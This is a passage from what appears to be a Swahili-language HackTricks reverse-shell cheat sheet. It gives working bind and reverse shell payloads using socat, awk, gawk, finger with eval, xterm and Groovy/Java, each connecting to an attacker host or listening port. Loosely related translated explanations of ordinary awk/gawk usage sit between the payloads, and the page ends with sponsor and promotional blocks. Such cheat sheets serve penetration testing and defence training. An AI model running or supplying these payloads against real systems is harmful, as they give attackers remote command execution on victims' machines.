./socat TCP-LISTEN:<port>,fork EXEC:/bin/bash
```

4. Badilisha `<port>` na namba ya bandari unayotaka kutumia kwa kifungu cha Bind.
5. Baada ya kutekeleza amri hiyo, Socat itasikiliza kwa uhusiano wa kuingia kwenye bandari iliyochaguliwa.
6. Sasa unaweza kutumia mteja wa kuingia kama Netcat kuunganisha kwenye kifungu cha Bind na kupata udhibiti wa kijijini juu ya mfumo wa lengo.

Kumbuka: Kifungu cha Bind kinaweza kuwa hatari na kinapaswa kutumiwa kwa madhumuni ya kisheria tu.
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Reverse shell

Kwa kifupi, reverse shell ni mbinu ya kudhibiti kompyuta ya lengo kutoka kwa kompyuta ya mshambuliaji. Mshambuliaji hutumia programu maalum ya shell ili kuunganisha na kompyuta ya lengo kupitia mtandao. Hii inaruhusu mshambuliaji kupata udhibiti kamili wa kompyuta ya lengo na kutekeleza amri mbalimbali.

Kuna njia kadhaa za kuanzisha reverse shell, ikiwa ni pamoja na kutumia programu za shell kama Netcat au Ncat, au kutumia programu maalum za kudhibiti kama Metasploit. Mshambuliaji anaweza kutumia mbinu hizi kuchukua udhibiti wa kompyuta ya lengo na kufanya shughuli mbalimbali, kama vile kuiba data au kutekeleza mashambulizi zaidi.

Reverse shell ni mbinu muhimu katika uwanja wa udukuzi na inaweza kutumiwa kwa njia mbalimbali. Ni muhimu kwa wataalamu wa usalama wa mtandao kuelewa jinsi mbinu hii inavyofanya kazi ili kuweza kuchunguza na kuzuia mashambulizi ya aina hii.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awk ni lugha ya programu ya kutumika kwa uchambuzi wa maandishi. Inaweza kutumika kwa ufanisi katika mazingira ya Unix na Linux kwa kuchanganua na kuchakata data iliyopangwa kwa safu.

### Jinsi ya Kutumia Awk

Awk inafanya kazi kwa kusoma faili ya maandishi kwa safu na kuchanganua kila safu kulingana na delimiter iliyotolewa. Kwa kila safu, unaweza kutekeleza hatua za Awk zinazohitajika.

Kwa mfano, ikiwa tuna faili ya maandishi inayoitwa "data.txt" na ina safu zilizotenganishwa na nafasi, tunaweza kutumia Awk kuchanganua safu ya kwanza na kuchapisha thamani zake:

```bash
awk '{print $1}' data.txt
```

Katika mfano huu, `$1` inawakilisha safu ya kwanza ya kila safu. Kwa hivyo, Awk itachapisha thamani ya safu ya kwanza kwa kila safu katika faili ya maandishi.

### Hatua za Awk

Awk inasaidia hatua nyingi ambazo zinaweza kutumika kwa kuchanganua na kuchakata data. Baadhi ya hatua muhimu ni pamoja na:

- `print`: Inachapisha thamani zilizochaguliwa.
- `if`: Inatekeleza sharti na hatua zinazofuata ikiwa sharti linakidhiwa.
- `for`: Inatekeleza hatua zinazofuata kwa kila kipengee katika safu iliyochaguliwa.
- `while`: Inatekeleza hatua zinazofuata wakati sharti linakidhiwa.
- `getline`: Inasoma safu inayofuata ya data kutoka kwa faili iliyosomwa.

### Awk Variables

Awk inasaidia aina kadhaa za variables ambazo zinaweza kutumika kwa kuhifadhi na kurejelea data. Baadhi ya variables muhimu ni pamoja na:

- `NF`: Inahifadhi idadi ya safu katika safu iliyochanganuliwa.
- `NR`: Inahifadhi idadi ya safu katika faili iliyochanganuliwa.
- `$0`: Inahifadhi safu nzima iliyochanganuliwa.

### Awk Functions

Awk ina seti ya kazi zilizojengwa ambazo zinaweza kutumika kwa kuchanganua na kuchakata data. Baadhi ya kazi muhimu ni pamoja na:

- `length()`: Inarudi urefu wa string iliyotolewa.
- `substr()`: Inarudi sehemu ya string iliyotolewa.
- `split()`: Inachanganua string iliyotolewa kulingana na delimiter iliyotolewa na kuirudisha kama safu ya vitu.

### Awk Regular Expressions

Awk inasaidia matumizi ya regular expressions kwa kuchanganua na kuchakata data. Unaweza kutumia regular expressions kwa kufanya utafutaji, kulinganisha, na kubadilisha data.

Kwa mfano, ikiwa tunataka kuchanganua safu zote zinazoanza na herufi "A" katika faili ya maandishi, tunaweza kutumia regular expression kama ifuatavyo:

```bash
awk '/^A/ {print}' data.txt
```

Katika mfano huu, `/^A/` inawakilisha regular expression ambayo inalinganisha safu zote zinazoanza na herufi "A". Awk itachapisha safu zote zinazolingana na regular expression hii.
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
Mtu anayeshambulia
```bash
while true; do nc -l 79; done
```
Kuandika amri, andika chini, bonyeza enter na bonyeza CTRL+D (kukomesha STDIN)

**Mtu aliyeathiriwa**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawk ni lugha ya programu ya kutafsiri na kuchambua data ya maandishi. Inatumika sana katika mazingira ya Unix na Linux kwa kusudi la kuchakata na kuchambua data. Gawk inaweza kutumika kama chombo cha uchambuzi wa data, kuchuja na kubadilisha data, na kufanya kazi na faili za maandishi.

### Kuanzisha Gawk

Gawk inaweza kuanzishwa kwa kutumia amri ifuatayo:

```bash
gawk 'programu' faili
```

Ambapo `'programu'` ni programu ya Gawk ambayo inaelezea jinsi data inavyopaswa kuchakatwa, na `faili` ni faili ya maandishi ambayo inapaswa kuchakatwa.

### Mifano ya Matumizi

Hapa kuna baadhi ya mifano ya matumizi ya Gawk:

- Kuchapisha safu fulani kutoka faili ya maandishi:

```bash
gawk '{print $2}' faili.txt
```

- Kuchuja data kulingana na sharti fulani:

```bash
gawk '$3 > 50' faili.txt
```

- Kufanya hesabu na takwimu kutoka kwa faili ya maandishi:

```bash
gawk '{sum += $1} END {print sum}' faili.txt
```

### Makala za Gawk

Gawk ina makala kadhaa ambazo zinaweza kutumiwa kwa uchambuzi wa data. Baadhi ya makala muhimu ni pamoja na:

- `print`: Inatumika kuchapisha data kwenye skrini.
- `if`: Inatumika kutekeleza hatua fulani ikiwa sharti linakidhiwa.
- `for`: Inatumika kutekeleza hatua fulani kwa idadi fulani ya mara.
- `while`: Inatumika kutekeleza hatua fulani wakati sharti linakidhiwa.
- `split`: Inatumika kugawanya data katika sehemu ndogo.
- `gsub`: Inatumika kubadilisha data kwa kutumia mabadiliko ya kawaida.
- `match`: Inatumika kupata kulinganisha kati ya data na muundo uliowekwa.

### Hitimisho

Gawk ni chombo muhimu katika uchambuzi wa data ya maandishi katika mazingira ya Unix na Linux. Inatoa njia rahisi na yenye nguvu ya kuchakata na kuchambua data. Kwa kujifunza na kuelewa Gawk, unaweza kuwa na uwezo wa kufanya uchambuzi wa data kwa ufanisi na ufanisi zaidi.
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

Hii itajaribu kuunganisha kwenye mfumo wako kwenye bandari 6001:
```bash
xterm -display 10.0.0.1:1
```
Kutumia (ambayo itasikiliza kwenye bandari 6001) unaweza kukamata kitanzi cha nyuma:
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

na [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) ANGALIZO: Java reverse shell pia inafanya kazi kwa Groovy
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Marejeo
* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Tafuta udhaifu unaofaa zaidi ili uweze kuzirekebisha haraka. Intruder inafuatilia eneo lako la shambulio, inatekeleza uchunguzi wa vitisho wa kujitokeza, inapata matatizo katika mfumo wako wa teknolojia mzima, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
